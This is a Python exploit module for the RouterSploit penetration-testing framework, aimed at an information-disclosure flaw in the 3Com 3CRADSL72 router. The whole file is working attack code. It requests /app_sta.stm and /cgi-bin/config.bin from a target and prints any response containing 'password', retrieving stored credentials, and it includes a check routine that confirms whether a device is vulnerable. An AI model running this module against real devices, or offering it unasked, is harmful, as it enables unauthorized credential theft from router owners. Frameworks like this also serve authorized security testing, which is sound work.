from routersploit import (
    exploits,
    print_status,
    print_error,
    print_info,
    print_success,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for 3Com 3CRADSL72 Information Disclosure vulnerability.
    If the target is vulnerable it allows to read sensitive information.
    """
    __info__ = {
        'name': '3Com 3CRADSL72 Info Disclosure',
        'description': 'Exploits 3Com 3CRADSL72 information disclosure vulnerability '
                       'that allows to fetch credentials for SQL sa account',
        'authors': [
            'Karb0nOxyde <karb0noxyde[at]gmail.com>',  # vulnerability discovery
            'Ivan Casado Ruiz <casadoi[at]yahoo.co.uk>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://lostmon.blogspot.com/2005/04/3com-adsl-11g-cradsl72-router.html',
            'http://www.securityfocus.com/bid/11408/exploit',
        ],
        'devices': [
            '3Com 3CRADSL72',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    resources = ["/app_sta.stm",
                 "/cgi-bin/config.bin"]

    def run(self):
        for resource in self.resources:
            url = "{}:{}{}".format(self.target, self.port, resource)

            print_status("Sending request to download sensitive information")
            response = http_request(method="GET", url=url)
            if response is None:
                return

            if response.status_code == 200 and "password" in response.text:
                print_success("Exploit success")
                print_status("Reading {} file".format(resource))
                print_info(response.text)
            else:
                print_error("Exploit failed - could not retrieve response")

    @mute
    def check(self):
        for resource in self.resources:
            url = "{}:{}{}".format(self.target, self.port, resource)

            response = http_request(method="GET", url=url)
            if response is None:
                continue

            if response.status_code == 200 and "password" in response.text:
                return True

        return False  # target not vulnerable
